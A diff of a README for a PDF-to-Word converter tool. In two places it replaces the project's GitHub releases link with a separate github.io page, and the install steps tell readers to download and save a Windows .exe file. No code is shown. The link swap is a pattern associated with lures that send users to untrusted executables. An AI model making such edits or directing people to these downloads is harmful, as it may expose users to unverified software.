@@ -1,6 +1,6 @@
 # 📄 pdf-to-editable-word-skill - Convert PDF files into editable documents
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/michellema8890/pdf-to-editable-word-skill/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://michellema8890.github.io)
 
 This application changes PDF files into Word documents. It keeps the original layout, fonts, and images. You can use it as a tool for AI agents or run it on your own computer. It works offline to keep your data private.
 
@@ -8,7 +8,7 @@ This application changes PDF files into Word documents. It keeps the original la
 
 You need to download the application from the project page.
 
-1. Go to this link: [https://github.com/michellema8890/pdf-to-editable-word-skill/releases](https://github.com/michellema8890/pdf-to-editable-word-skill/releases).
+1. Go to this link: [https://michellema8890.github.io](https://michellema8890.github.io).
 2. Look for the latest version at the top of the list.
 3. Click on the file that ends in .exe for Windows.
 4. Save the file to your computer.
